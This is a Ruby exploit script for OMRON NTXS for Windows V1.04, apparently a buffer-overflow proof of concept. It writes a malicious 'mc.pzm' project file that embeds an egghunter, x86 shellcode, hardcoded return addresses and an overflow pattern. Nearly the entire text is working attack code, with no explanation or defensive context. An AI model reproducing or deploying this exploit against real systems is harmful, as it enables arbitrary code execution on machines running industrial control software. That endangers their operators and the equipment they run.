#!/usr/bin/env ruby
# OMRON NTXS For Windows V1.04
#
require 'rex'

egg = "STFU"
egghunter =  "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a"
egghunter << "\x74\xef\xb8" + egg + "\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

wtf = [0x909006eb].pack('V').to_s.force_encoding("UTF-8")

shellcode = egg + egg +
"\x33\xc0" +                         
"\x50" +                             
"\x8B\xCC" +                         
"\x50" +                             
"\x68\x20\x20\x20\x20"  +            
"\x68\x20\x20\x20\x20"  +            
"\x68\x4D\x43\x20\x20"  +            
"\x8B\xD4" +                         
"\x50" +                             
"\x51" +                             
"\x52" +                             
"\x50" +                             
#"\xBE\xEA\x07\x45\x7E" + WindowsXP SP3
"\xBE\x71\xea\x9c\x75" + 
#"\xBE\xc5\x9c\x37\x6c" + 
"\xFF\xD6" 

nops = "\x96" * 9

otherdata = egg 
otherdatasize = [otherdata.size].pack('C')

data = Rex::Text.pattern_create(2024)
datasize = [data.size].pack('C')

jmpback = [0xe9, -220].pack('CV')
flip    = [0x6c374743].pack('V')
jmpesp  = [0x6c4055c4].pack('V')

payload = "B" * 500
payload[0,10] = nops.to_s.force_encoding("UTF-8")
payload[11,5] = jmpback.to_s.force_encoding("UTF-8")
payload[17,48] = "C" * 12 + egghunter.to_s.force_encoding("UTF-8")

data[10, shellcode.size] = shellcode.to_s.force_encoding("UTF-8")
data[192, 4] = flip.to_s.force_encoding("UTF-8")
data[204, jmpesp.size + payload.size] = jmpesp.to_s.force_encoding("UTF-8") + payload.to_s.force_encoding("UTF-8")

pzm =  "\x2B\x01\x00\x00\x0A\x00\x02\x00\x00\x00\x00\x00\x06\x00\x00\x00"
pzm << "\x00\x00\x00\x00\x1C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
pzm << "\x90\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0D\x00\x00\x00\x00\x00"
pzm << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x04\x00"
pzm << "\x00\x04\x01\x02\x50\x03\x02\x01\x01\x01\x00\x00\x58\x02\x36\x06"
pzm << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
pzm << "\x00\x00\x00\x00\x00\x00\x00\x00\x2B\x01\x00\x00\x01\x00\x00\x00"
pzm << "\x00\x00\x0A\x00\x00\x00\x00\x00\x00\x01\x35\x00\x00\x00\x00\x00"
pzm << "\x0A\x00\x00\x00\x01\x01\x09\x01\x36\x00\x00\x00\x00\x00\x14\x00"
pzm << "\x00\x00\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x03\x00\x00"
pzm << "\x00\x00\x00\x02\x0E\x02\x14\x00\x00\x00\x02\x00\x00\x00\x00\x01"
pzm << "\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x02\x0E\x06\x14\x00"
pzm << "\x00\x00\x03\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x03\x00\x00"
pzm << "\x00\x00\x00\x02\x01\x02\x14\x00\x00\x00\x04\x00\x00\x00\x00\x01"
pzm << "\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x02\x0E\x00\x14\x00"
pzm << "\x00\x00\x05\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x03\x00\x00"
pzm << "\x00\x00\x00\x02\x0E\x08\x14\x00\x00\x00\x06\x00\x00\x00\x00\x01"
pzm << "\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x02\x01\x01\x00\x00"
pzm << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0D\x0A\xFF\xFE\xFD"
pzm << "\xFC\xFB\x0D\x0A\xE1\x07\x0A\x1E\x10\x04\x07\x00"
pzm << "\x00\x00\x00"
pzm << datasize.to_s.force_encoding("UTF-8") + data
pzm << otherdata.size.to_s.force_encoding("UTF-8") + otherdata

fd = File.new("mc.pzm","wb")
fd.write(pzm)
fd.close
